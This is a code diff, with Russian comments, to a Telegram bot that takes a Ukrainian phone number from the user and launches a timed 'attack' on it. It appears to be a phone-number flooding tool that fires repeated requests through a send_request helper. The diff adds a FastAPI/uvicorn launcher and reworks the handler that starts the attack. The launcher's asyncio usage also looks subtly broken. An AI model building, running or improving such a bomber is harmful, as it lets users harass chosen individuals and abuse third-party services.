@@ -10,6 +10,8 @@ from aiogram.dispatcher.filters.state import State, StatesGroup
 import sqlite3
 import config
 import aiohttp
+from fastapi import FastAPI
+import uvicorn
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -28,6 +30,10 @@ storage = MemoryStorage()
 bot = Bot(token=config.token)
 dp = Dispatcher(bot, storage=storage)
 
+# Создаем FastAPI приложение
+app = FastAPI()
+
+# Аnti-flood обработчик
 async def anti_flood(*args, **kwargs):
     m = args[0]
     await m.answer("Хватит спамить!")
@@ -44,6 +50,7 @@ admin_keyboard.add("Назад")
 class Dialog(StatesGroup):
     spam = State()
 
+# Добавление нового пользователя
 async def add_user(user_id: int, name: str, username: str):
     cur.execute('INSERT INTO users(user_id, name, username, block) VALUES (?, ?, ?, ?)', (user_id, name, username, 0))
     profile_link = f'<a href="tg://user?id={user_id}">{name}</a>'
@@ -123,6 +130,7 @@ async def help(message: types.Message):
 async def start_attack_prompt(message: Message):
     await message.answer('Введите номер телефона.\nПример:\n<pre>🇺🇦380xxxxxxxxx</pre>', parse_mode="html", reply_markup=profile_keyboard)
 
+# Функция для отправки запроса
 async def send_request(url, data=None, json=None, headers=None, method='POST'):
     async with aiohttp.ClientSession() as session:
         if method == 'POST':
@@ -194,16 +202,18 @@ async def start_attack(number):
 
     logging.info(f"Атака на номер {number} завершена через 60 секунд")
 
-@dp.message_handler(content_types=['text'])
-@dp.throttled(anti_flood, rate=3)
-async def handle_phone_number(message: Message):
+@dp.message_handler(state=Dialog.spam, content_types=types.ContentType.TEXT)
+async def start_spam(message: Message, state: FSMContext):
     number = message.text
-    if len(number) == 12:
-        await message.answer(f'🇺🇦Атака началась на номер <pre>{number}</pre>', parse_mode="html")
-        asyncio.create_task(start_attack(number))
-    else:
-        await message.answer('Неправильный формат номера.')
+    await message.answer(f"Запуск атаки на {number}")
+    await start_attack(number)
+    await state.finish()
 
-if __name__ == '__main__':
-    logging.info("Запуск бота...")
-    executor.start_polling(dp, skip_updates=True)
+# Основная функция для запуска
+async def on_start():
+    loop = asyncio.get_event_loop()
+    loop.create_task(dp.start_polling())
+    uvicorn.run(app, host="0.0.0.0", port=10000)
+
+if __name__ == "__main__":
+    asyncio.run(on_start())
